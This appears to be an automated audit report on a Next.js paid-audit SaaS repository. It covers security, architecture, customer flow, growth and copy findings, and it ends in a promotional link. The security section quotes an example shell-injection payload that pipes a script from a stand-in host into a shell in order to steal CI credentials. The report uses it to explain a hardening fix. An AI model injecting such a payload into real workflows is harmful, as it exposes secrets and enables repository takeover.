```
[detecting stack...]
✓ Node / TypeScript / JavaScript
✓ Next.js 14.2.35 (App Router)
✓ Git repo (3699954) — Drizzle ORM + libSQL/Turso (prod) with better-sqlite3 fallback
✓ Stripe payments, Anthropic Claude API, Upstash Redis (ratelimit), Resend (email), Vercel deploy
✓ 210 source files in scope

[semgrep running...]
✓ 1 ERROR finding (security-audit + owasp-top-ten + secrets configs, 30s timeout)
  ERROR  yaml.github-actions.security.run-shell-injection
         .github/workflows/eval-regression.yml:62
         workflow_dispatch input interpolated into a run: step

[6 modules dispatching in parallel...]

✓ Roast                    done
✓ Security                 score 8/10
✓ Architecture             score 8/10
✓ Customer Flow            score 7/10
✓ Growth                   score 9/10
✓ Founder Briefing         done

Total: ~38s wall-clock. No extra charge on Claude Pro/Max.

────────────────────────────────────────────────────
THE ROAST

Your H1 in app/page.tsx:535 reads "Your business deserves to be built for
scale." which is the same generic enterprise-software promise every Webflow
template has shipped since 2019. The sub-headline (app/page.tsx:554) saves it
by naming what you actually do — "audit your design, architecture, security,
and GitHub repo" — but the headline above it makes you sound like a Salesforce
implementation partner, not a guy who runs semgrep against vibe-coded
Next.js apps. Your README opens with "A web application that analyzes
landing pages, generates comedic roasts, provides detailed audits, and
creates redesigned landing pages that actually convert" — which is four
overlapping clauses and a comma splice describing the *2024 version* of this
product before you pivoted to senior-engineer audits. The component named
SpaceBackground.tsx is now 54 lines of static dot grid (file header:
"replaces the animated space canvas") but the CLAUDE.md still describes a
790-line canvas with 1200 stars across 3 depth layers. You're shipping the
new positioning ("evidence-cited senior engineer review") in your nav CTA
("Audit My Project →") and the sub-headline, but the H1 and README haven't
caught up. Fix those two surfaces and the rest of the marketing already
matches what you sell.

────────────────────────────────────────────────────
SECURITY (8/10)

Solid posture. The thing you'd expect to be broken — the Stripe webhook —
is the cleanest code in the repo. Real issues are limited to one CI/CD
shell-injection vector that an outside contributor could not trigger, and
the standard "this is a marketing site, not a SaaS dashboard" gaps.

• [HIGH] Shell injection via workflow_dispatch input
  .github/workflows/eval-regression.yml:62 (rule:
  yaml.github-actions.security.run-shell-injection)
  The `fixture_ids` workflow_dispatch input is interpolated directly into a
  `run:` block as `--id="${{ inputs.fixture_ids }}"`. Anyone with
  workflow_dispatch permission on the repo (today: you only, but any future
  collaborator with write access) can inject shell via a string like
  `"; curl evil.sh | sh; #`. The job has ANTHROPIC_API_KEY and GITHUB_PAT
  in env — direct credential exfiltration path.
  Fix: pass the input through `env:` first, e.g. `env: { FIXTURE_IDS:
  '${{ inputs.fixture_ids }}' }` then reference `"$FIXTURE_IDS"` in the
  script. Standard GHA hardening pattern.

• [INFO] Stripe webhook verification correctly placed before any DB write
  app/api/stripe/webhook/route.ts:25
  Not a finding — confirming the thing this module would normally flag.
  `stripe.webhooks.constructEvent(rawBody, signature, webhookSecret)` runs
  before any branch into `applyTerminalStatus`. Idempotency keyed on
  `paymentIntentId`. Referral credit grant gated on the first-apply-only
  outcome. This is what the docs say to do and the code does it.

• [INFO] /api/review/run does six-layer payment verification
  app/api/review/run/route.ts:178-251
  Stripe API retrieve → status === succeeded → product metadata match →
  amount >= REVIEW_PRICE_CENTS → URL/repoUrl metadata match → single-use
  enforcement (409 if projectId already linked). This is more defense than
  most $19 products ship.

• [INFO] Rate limiting wired through middleware with three buckets
  middleware.ts:1-94 + lib/utils/upstash-ratelimit.ts:36-91
  `expensive` (10/hr), `stripe` (10/hr), `default` (60/min). Webhook
  explicitly excluded via early-return, not matcher — correct because
  Stripe retries need to land. Owner-bypass gated on
  VERCEL_ENV !== "production".

The remaining items semgrep + a read pass would normally flag (CORS,
CSP, secret exposure) are clean: `.env.local` is `.gitignore`'d by the
`.env*` rule, no `dangerouslySetInnerHTML` outside of JSON-LD blocks
where the input is a literal object, no `eval`, no SQL string
concatenation (Drizzle parameterizes everything).

────────────────────────────────────────────────────
ARCHITECTURE (8/10)

Production-grade. The data layer is well-designed (Turso in prod with a
better-sqlite3 dev fallback, both gated by `hasTursoCredentials()` —
lib/db/index.ts:137), the API surface uses Vercel's 300s max-duration
deliberately with a written-out budget comment explaining the 120s+60s+10s
math (app/api/review/run/route.ts:13-25), and the orchestrator splits
phase-one and synthesis across two separate serverless invocations to get
two full 300s budgets instead of fighting one (lib/review/orchestrator.ts:62-94).
That's the kind of decision a fractional CTO would write up in a design doc.
The scale wall isn't compute, it's per-audit LLM cost ($0.90 according to
the founder's own memory file) — that walls revenue, not infrastructure.

Other smells:

• app/page.tsx is 1590 lines. The HeroUrlInput inline client component
  (lines 29-76), the SERVICES array (line 82+), the LANDING_FAQ_SCHEMA, the
  scroll-reveal logic, and the page render are all in one file. Splitting
  would not unblock any feature today but every edit to one section forces
  a re-read of the other four. Lift HeroUrlInput, SERVICES, and the FAQ
  data into their own files — 30 minutes, no behavior change.

• lib/review/orchestrator.ts is 1127 lines. Includes the competitor
  identification prompt inline (line 206-216), the runModule fallback
  generator (line 253+), and the phase-one / synthesis split. This file is
  the product's load-bearing wall. It deserves a `lib/review/orchestrator/`
  directory with `runModule.ts`, `identifyCompetitors.ts`, `runPhaseOne.ts`
  as siblings. Same logic, navigable diffs.

• lib/review/demoResult.ts is 1232 lines of hardcoded JSON. Fine as-is —
  it's literally a static fixture for /r/demo. Flagging only because if it
  ever drifts from the schema, the demo page silently breaks. Add a
  Zod-validation unit test that imports it and runs it through the
  reviewSchema. Cheap.

SCALE CEILING

First wall: per-audit Claude API spend at ~$0.90 caps unit economics, not
concurrency.
  Why: Each $19 audit fires 7 modules in parallel via generateJSONOnce
       (lib/review/orchestrator.ts:267-272) at maxTokens 5000 each, plus
       founder briefing synthesis, plus competitor identify. With Anthropic
       Tier 2 RPM limits the wall is *price per audit*, not requests per
       second. At ~$0.90 cost and $19 price you have ~95% gross margin,
       but every prompt expansion or model upgrade narrows it. The fan-out
       is the cost, not the bottleneck.
  Fix: Cache the user-prefix block on every module call (the cachedUserPrefix
       arg is already plumbed through runModule — confirm it's actually
       set for every module, not just two). Anthropic prompt cache cuts
       repeat-prefix tokens to ~10% of price. Mentioned in your own memory
       file (feedback_anthropic_cache_key.md) — verify the SYSTEM-slot fix
       landed for every module, not just module fan-out.

Second wall: Turso row count at the free-tier 1 billion read ceiling, hit
at maybe 100k audits.
  Why: review_results stores one JSON blob per module per project. At
       7-8 modules per project + the projects/payments/extracts tables,
       you're at ~12 rows per audit. Free Turso is 1B row reads /month;
       paid is $29/mo for 10x. Comfortably 100k-audits-per-month before
       you notice.
  Fix: Nothing today. Migrate to Turso paid tier when monthly audits
       cross 8000. Until then the architecture supports your growth
       trajectory.

────────────────────────────────────────────────────
CUSTOMER FLOW (7/10)

The flow is *URL → free teaser → pay $19 → audit*. There's no signup, no
email gate, no dashboard — the audit is the product, the share URL is the
artifact. That's a strong choice. The friction is in the payment step,
which sits inline on /review (components/ReviewInputForm.tsx, 689 lines),
runs a free teaser scan first, then opens Stripe Elements, then dispatches
the full audit. Click count to first value is 3-4 (paste URL → see teaser →
pay → audit), which is good for a $19 paid product. The teaser-first
pattern earns trust before asking for the card, which is exactly right
for the $19 price point.

Specific findings:

• [MEDIUM] No empty-state / blank-slate education on the landing CTA
  app/page.tsx:526-543 + 566
  The H1 + sub-headline + URL input is a strong above-the-fold CTA but
  there's no "here's what an audit looks like" without scrolling to
  section 4 (8-module preview). The nav has an "Example Audit" link
  pointing at a real audit (app/page.tsx:439), which is the right move —
  but it's nav-text-small and not contrasted against the hero. Move the
  "See an example" call-out inline directly under the URL input.

• [MEDIUM] CLAUDE.md "Pending Work" list shows landing copy debt
  CLAUDE.md (Pending Work section — quoted verbatim)
  The repo's own context file flags: "Pricing section still shows 'Quick
  Roast (Free)' tier", "Comparison table row shows 'Free'", "FAQ still
  mentions 'What do I get in the free roast?'", "URL input button still
  says 'Roast It →'". The free-roast-skill pivot left visible artifacts.
  The hero CTA in the current file does say "Audit My Project $19 →"
  (app/page.tsx:69), so some debt is paid down — confirm the rest in
  the FAQ and pricing sections matches the new 4-tier funnel.

• [LOW] Owner-bypass token check uses bool comparison, not constant-time
  app/api/review/run/route.ts:60 ("Constant-ish comparison — short
  enough that bool comparison is fine.")
  The comment is honest, but timing-attack feasibility on a token compared
  with `===` is non-zero. The code says it knowingly. Defer until you
  have collaborators or external testers with the token.

Upgrade-path friction is N/A here — there's no in-product upsell because
there's no in-product anything. The audit IS the product, surfaced as a
shareable URL. That's deliberate and well-executed.

────────────────────────────────────────────────────
GROWTH (9/10)

The strongest module. Sitemap, robots, JSON-LD, OG cards, analytics,
referral mechanic, GEO/LLM-search opt-in, and a programmatic SEO surface
(/audit/[tool] + /checklist/[topic]) are all wired. This is what a growth
advisor would prescribe for an early-stage paid SaaS that needs
distribution before it needs features.

Discoverability:
• app/sitemap.ts:10-44 — full dynamic sitemap with audit-tool slugs and
  checklist topics included; private routes (/r/, /p/, /d/, /share/)
  correctly excluded.
• app/robots.ts:19-33 — explicit allow-list for AI crawlers (GPTBot,
  ClaudeBot, PerplexityBot, Google-Extended, Bytespider, etc.). This is
  GEO done right — explicit signal beats conservative default.
• app/llms.txt is present (verified via `find`). Pairs with the AI-crawler
  allow-list above.

Structured data:
• app/layout.tsx:98-113 — four JSON-LD blocks (Organization, WebSite,
  SoftwareApplication, Product with $19 offer). All injected via
  dangerouslySetInnerHTML on JSON.stringify of literal objects — safe.
• app/page.tsx:407-410 — page-scoped FAQ schema sourced from FAQ_ITEMS
  so on-page Q&As and structured data can't drift. Good engineering.

Analytics:
• app/page.tsx:39 — `posthog.capture("url_entered", { url })` fires on
  every hero submit. PostHog wired via PostHogProvider in
  app/providers.tsx:10. Founder can iterate on conversion.

Share metadata:
• og-image.png present in public/. metadataBase + openGraph.images + twitter
  card all configured in app/layout.tsx:39-63.

Referral:
• Schema has `referrerProjectId` on payments + `freeReauditCredits` on
  projects (app/api/stripe/webhook/route.ts:91 grants the credit on the
  first terminal-status apply). Built, shipped, atomic.

Content surface:
• /audit/[tool] programmatic pages from lib/audit-tools/data.ts (537 lines
  of per-tool content).
• /checklist/[topic] sibling series from lib/checklists/data.ts. Same
  pattern, sibling sitemap entries.

The single growth gap I'd flag: tool/checklist pages have generic-but-true
issue lists with stats fields explicitly held back "until we have ≥20
audits per tool" (lib/audit-tools/data.ts:11). That's correct restraint —
fake stats would erode the trust the rest of this module earns — but it
means the long-tail SEO pages currently underperform the founder pages.
Worth a scheduled job to refresh stats from real audit data once the
threshold is hit.

────────────────────────────────────────────────────
FOUNDER BRIEFING

You're a one-person team running a Next.js 14 app on Vercel + Turso,
shipping a paid $19 audit product (cost-per-audit ~$0.90 by your own
memory file) with a $49/mo Co-Pilot and $199 Briefing tier laid out on
the landing but only the $19 audit wired into Stripe. The code says
"production SaaS built by an engineer who has shipped before" — six-layer
Stripe payment verification, idempotent webhook handling with a tab-close
fallback fetch, two-function 600s synthesis budget, Drizzle-managed Turso
migrations with a custom bootstrap for legacy schemas, three-bucket rate
limiting via Upstash, explicit AI-crawler allowlist, programmatic SEO
surface, referral credit grants gated on first-apply only. This is not
vibe-coded. This is the senior-engineer-shipping-fast pattern, evidenced
by the inline design-doc comments on every load-bearing function.

What's working: Security (8/10) and Growth (9/10) are the standout
modules. Stripe webhook is the cleanest code in the repo, payment
verification is multi-layered, and the growth surface (sitemap + robots
+ JSON-LD + analytics + referral + GEO + programmatic SEO) is what every
early-stage paid SaaS wishes it had on day one. Architecture is solid
(8/10) — the 1127-line orchestrator and 1590-line page.tsx are debt, not
emergencies, and the Anthropic prompt-cache opportunity is a margin
upgrade not a bug fix.

The order below leads with the GHA shell-injection because it's the one
finding with active credential-exfil potential, then the landing-copy
debt because it's the only Roast-module issue with a concrete fix, then
the orchestrator file split because it's the only Architecture finding
that will hurt at the next prompt-system overhaul. Three things to do
this week. Nothing on fire.

────────────────────────────────────────────────────
TOP-3 PRIORITIES (ordered by what costs you most)

1. [HIGH] .github/workflows/eval-regression.yml:62
   `inputs.fixture_ids` from a `workflow_dispatch` is interpolated directly
   into a `run:` block alongside ANTHROPIC_API_KEY + GITHUB_PAT in env. A
   future repo collaborator (or compromised collaborator account) can inject
   shell via a crafted input string and exfiltrate both credentials. Cost
   today: zero (solo repo). Cost the day you add a contributor: every secret
   that workflow has access to.
   Fix: Move the input into `env: FIXTURE_IDS: ${{ inputs.fixture_ids }}`
   and reference `"$FIXTURE_IDS"` in the shell script. 3-line change.

2. [MEDIUM] app/page.tsx:535 + README.md:3
   H1 reads "Your business deserves to be built for scale." and README
   opens with the 2024-era four-clause "analyzes landing pages, generates
   comedic roasts, provides detailed audits, and creates redesigned
   landing pages." Both undersell the actual product (evidence-cited
   senior-engineer audit). The nav CTA, sub-headline, and pricing block
   already match the new positioning — these two surfaces are the
   stragglers. Cost: every visitor who reads the H1 and bounces because
   it sounds like a Salesforce partner pitch.
   Fix: Replace the H1 with a verb-first line that names the product
   ("Audit your vibe-coded site before your users do.") and rewrite the
   README opener to a single sentence describing the senior-engineer
   review product.

3. [LOW] lib/review/orchestrator.ts (1127 lines) + app/page.tsx (1590 lines)
   Both are load-bearing files growing past the point where a single
   read fits the context window comfortably. Not breaking anything today.
   Becomes painful the next time you refactor the prompt system or
   restructure the landing page. Cost: half-day of orientation tax on
   every future edit, multiplied across the next 12 months.
   Fix: Split orchestrator.ts into a `lib/review/orchestrator/` directory
   with `runModule.ts`, `identifyCompetitors.ts`, `runPhaseOne.ts`,
   `runSynthesis.ts`. Lift HeroUrlInput, SERVICES, and LANDING_FAQ_SCHEMA
   out of page.tsx into their own files. No behavior change; one PR each.

Want this on your live URL with screenshots, Lighthouse, axe-core,
competitor teardown, and the 90-day founder roadmap?
→ https://roastrebuild.com/review — $19
```
